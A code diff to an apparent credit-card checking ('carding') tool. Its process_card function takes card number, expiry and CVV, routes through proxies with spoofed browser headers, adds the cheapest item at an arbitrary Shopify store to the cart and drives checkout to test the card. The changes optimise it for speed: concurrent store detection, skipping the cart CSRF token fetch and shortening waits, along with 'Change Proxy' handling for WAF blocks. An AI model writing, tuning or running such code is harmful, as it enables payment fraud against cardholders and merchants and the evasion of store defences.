@@ -1746,32 +1746,62 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 warm_headers = build_headers(profile, ourl, for_document=True)
                 xhr_headers = build_headers(profile, ourl, for_document=False)
 
-            _root_html = ""
-            try:
-                _warm = await session.get(ourl, headers=warm_headers, proxy=proxy,
-                                          timeout=8, allow_redirects=True)
+            # 🔥 SPEED: warmup root GET runs CONCURRENTLY with currency + candidate
+            # detection — none of them need cart cookies, so serial costs ~2.5s
+            # for nothing. Verification still runs on the warmup response.
+            async def _warm():
                 try:
-                    _root_html = _warm.text or ""
-                except Exception:
-                    pass
-                print(f"[warmup] ✅ {time.time()-t0:.2f}s root primed")
-            except Exception as e:
-                print(f"[warmup] ⚠️ {str(e)[:80]}")
+                    w = await session.get(ourl, headers=warm_headers, proxy=proxy,
+                                          timeout=8, allow_redirects=True)
+                    print(f"[warmup] ✅ {time.time()-t0:.2f}s root primed")
+                    return w.text or ""
+                except Exception as e:
+                    print(f"[warmup] ⚠️ {str(e)[:80]}")
+                    return "WARMUP_FAILED"
+
+            # 🔥 SPEED: *.myshopify.com hosts are Shopify by definition — skip
+            # the warmup root GET entirely (detect's requests establish the TLS
+            # session). Custom domains warm CONCURRENTLY with detection.
+            _host_shopify = ourl.split("//")[1].split("/")[0].lower().endswith(".myshopify.com")
+            _root_html = ""
+            if variant_id:
+                res = await asyncio.gather(*([_warm()] if not _host_shopify else []) +
+                                           [detect_store_currency(session, ourl, proxy, profile)],
+                                           return_exceptions=True)
+                _off = 1 if not _host_shopify else 0
+                if not _host_shopify:
+                    _root_html = res[0] if isinstance(res[0], str) else ""
+                if isinstance(res[_off], str) and res[_off]: currency = res[_off]
+                candidate = None
+                print(f"[detect] ✅ {time.time()-t0:.2f}s currency={currency} candidate=provided")
+            else:
+                res = await asyncio.gather(
+                    *([_warm()] if not _host_shopify else []) +
+                    [detect_store_currency(session, ourl, proxy, profile),
+                     fetch_cheapest_candidate(session, ourl, profile, proxy)],
+                    return_exceptions=True)
+                _off = 1 if not _host_shopify else 0
+                if not _host_shopify:
+                    _root_html = res[0] if isinstance(res[0], str) else ""
+                if isinstance(res[_off], str) and res[_off]: currency = res[_off]
+                candidate = res[_off + 1] if not isinstance(res[_off + 1], Exception) else None
+                print(f"[detect] ✅ {time.time()-t0:.2f}s currency={currency} candidate={'yes' if candidate else 'no'}")
+
+            if not _host_shopify and _root_html == "WARMUP_FAILED":
                 return False, "Change Proxy", gateway, variant_price_fallback, currency
 
-            # 🔥 FIX: Abort if this isn't a Shopify site — but the warmup ROOT
-            # response is the strongest evidence: *.myshopify.com hosts are
-            # Shopify by definition, and the root HTML carries Shopify markers
-            # (cdn.shopify.com / Shopify.theme / shopify-features). Only fall
-            # back to meta.json/cart.js probes when the root shows nothing.
-            _host_shopify = ourl.split("//")[1].split("/")[0].lower().endswith(".myshopify.com")
+            # 🔥 FIX: only custom domains need content proof — the warmup ROOT
+            # response carries Shopify markers (cdn.shopify.com / Shopify.theme /
+            # shopify-features); fall back to meta.json/cart.js probes when the
+            # root shows nothing. A live myshopify store ALWAYS serves
+            # products.json — its failure means the egress, not the store.
             _root_shopify = any(m in _root_html for m in
                                 ("cdn.shopify.com", "Shopify.theme", "shopify-features",
                                  "myshopify.com", "Shopify.cdn"))
             if _host_shopify or _root_shopify:
                 is_shopify = True
                 print(f"[verify] ✅ Shopify via {'host' if _host_shopify else 'root markers'}")
-            else:
+            elif not _host_shopify:
                 is_shopify = await verify_shopify_store(session, ourl, proxy, profile)
                 if is_shopify == "CONNECTION_DEAD":
                     # egress never answered a single request — proxy problem, NOT
@@ -1783,21 +1813,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, "NOT_SHOPIFY", gateway, variant_price_fallback, currency
                 print(f"[verify] ✅ Confirmed Shopify store")
 
-            if variant_id:
-                res = await asyncio.gather(detect_store_currency(session, ourl, proxy, profile),
-                                           return_exceptions=True)
-                if isinstance(res[0], str) and res[0]: currency = res[0]
+            if isinstance(candidate, tuple):
+                # fetch_cheapest_candidate signals failure as (False, msg)
+                _cm = str(candidate[1] or "")
+                if "proxy error" in _cm.lower() or "error" in _cm.lower():
+                    print(f"[detect] catalog fetch failed → Change Proxy ({_cm[:60]})")
+                    return False, "Change Proxy", gateway, "0.00", currency
                 candidate = None
-                print(f"[detect] ✅ {time.time()-t0:.2f}s currency={currency} candidate=provided")
-            else:
-                res = await asyncio.gather(
-                    detect_store_currency(session, ourl, proxy, profile),
-                    fetch_cheapest_candidate(session, ourl, profile, proxy),
-                    return_exceptions=True)
-                if isinstance(res[0], str) and res[0]: currency = res[0]
-                candidate = res[1] if not isinstance(res[1], Exception) else None
-                print(f"[detect] ✅ {time.time()-t0:.2f}s currency={currency} candidate={'yes' if candidate else 'no'}")
-
             if not candidate and not variant_id:
                 return False, "<b>No Purchasable Products!</b>", gateway, "0.00", currency
 
@@ -1844,10 +1866,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             print(f"[cart] ✅ {time.time()-t0:.2f}s variant={variant_id} "
                   f"price={variant_price_fallback} ship_req={cart_requires_shipping}")
 
-            cart_html = await view_cart_page(session, ourl, add_referer, proxy, profile)
-
+            # 🔥 SPEED: skip the /cart page GET on the happy path — the checkout
+            # POST usually succeeds without the CSRF token. Only fetch the cart
+            # page (for the token) if the token-less creation fails.
             checkout_url, text, response = await resolve_checkout_after_cart(
-                session, ourl, cart_html, proxy, profile)
+                session, ourl, None, proxy, profile)
+            if not checkout_url or not response:
+                cart_html = await view_cart_page(session, ourl, add_referer, proxy, profile)
+                checkout_url, text, response = await resolve_checkout_after_cart(
+                    session, ourl, cart_html, proxy, profile)
             if not checkout_url or not response:
                 if is_waf_block(text or ""):
                     return False, "Change Proxy", gateway, variant_price_fallback, currency
@@ -2359,7 +2386,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 print(json.dumps(resp_json, indent=2)[:2000])
 
             if dtype == "PendingTerms":
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(0.6)
                 response, resp_text = await gql(
                     session, "Proposal", headers, proposal_payload, proxy,
                     checkout_html=text, checkout_origin=checkout_origin,
@@ -2934,7 +2961,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             last_server_delay = None
             for i in range(RECEIPT_POLL_MAX + 2):
                 if i == 0:
-                    await asyncio.sleep(2.0)
+                    await asyncio.sleep(0.8)
                 else:
                     if last_server_delay is not None:
                         await asyncio.sleep(last_server_delay + 0.2)
